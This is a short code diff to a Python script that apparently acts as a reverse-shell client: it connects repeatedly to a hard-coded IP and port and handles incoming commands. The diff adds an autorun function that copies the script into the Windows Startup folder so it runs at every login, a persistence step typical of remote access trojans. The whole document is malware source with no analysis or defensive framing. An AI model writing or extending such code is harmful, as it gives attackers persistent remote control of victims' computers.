@@ -2,9 +2,14 @@ import socket
 import time
 import subprocess
 import threading
+import os
 
 IP = '192.168.0.109'
 PORT = 3333
+
+def autorun():
+    filename = os.path.basename(__file__)
+    os.system('copy {} "\\%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"'.format(filename))
 
 def connect(IP, PORT):
     try:
@@ -42,6 +47,7 @@ def cmd(client, data):
         print('ERROR: ', Error)
 
 if __name__ == '__main__':
+    autorun()
     while True:
         client = connect(IP, PORT)
         if client:
